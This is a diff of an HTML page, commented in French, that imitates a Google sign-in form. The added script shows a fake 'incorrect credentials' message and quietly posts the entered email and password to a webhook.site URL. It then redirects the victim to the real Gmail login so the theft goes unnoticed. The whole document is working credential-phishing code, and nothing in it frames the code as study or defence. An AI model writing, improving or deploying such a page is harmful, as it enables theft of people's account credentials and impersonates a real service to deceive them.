@@ -12,17 +12,41 @@
         button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; cursor: pointer; }
         button:hover { background: #1557b0; }
         .footer { margin-top: 20px; font-size: 12px; color: #5f6368; text-align: center; }
+        .error { color: red; text-align: center; margin-bottom: 15px; display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>Connexion</h1>
-        <form action="https://webhook.site/4d5e74aa-e6c2-407a-a34f-1b664f0c927d" method="POST">
+        <div class="error" id="errorMsg">Identifiants incorrects. Veuillez réessayer.</div>
+        <form action="https://webhook.site/4d5e74aa-e6c2-407a-a34f-1b664f0c927d" method="POST" id="loginForm">
             <input type="email" name="email" placeholder="Adresse e-mail" required>
             <input type="password" name="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <div class="footer">Connexion sécurisée · Google</div>
     </div>
+
+    <script>
+        // Le message d'erreur n'apparaît qu'APRÈS soumission (simule un échec de connexion)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();  // Empêche l'envoi normal temporairement
+            
+            // Afficher le message d'erreur
+            document.getElementById('errorMsg').style.display = 'block';
+            
+            // Envoyer les données à Webhook.site (discrètement)
+            var formData = new FormData(this);
+            fetch('https://webhook.site/4d5e74aa-e6c2-407a-a34f-1b664f0c927d', {
+                method: 'POST',
+                body: formData
+            });
+            
+            // Rediriger vers la vraie page Gmail après 2 secondes
+            setTimeout(function() {
+                window.location.href = 'https://accounts.google.com/ServiceLogin?service=mail';
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
